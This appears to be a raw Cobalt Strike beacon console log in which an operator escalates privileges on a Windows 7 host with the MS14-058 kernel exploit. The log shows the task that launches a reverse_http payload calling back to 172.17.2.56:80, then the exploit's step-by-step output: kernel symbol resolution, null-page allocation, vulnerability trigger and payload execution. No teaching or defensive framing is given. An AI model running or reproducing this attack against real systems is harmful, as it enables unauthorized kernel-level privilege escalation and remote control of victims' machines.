02/05 10:04:38 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 2112; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/05 10:05:57 [input] <neo> elevate ms14-058 test
02/05 10:05:57 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/05 10:06:30 [checkin] host called home, sent: 104503 bytes
02/05 10:06:31 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43520
[*] Parsing SYSTEM_INFO...
[*] 147 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c16000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F691FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F6C9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C28BE500
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


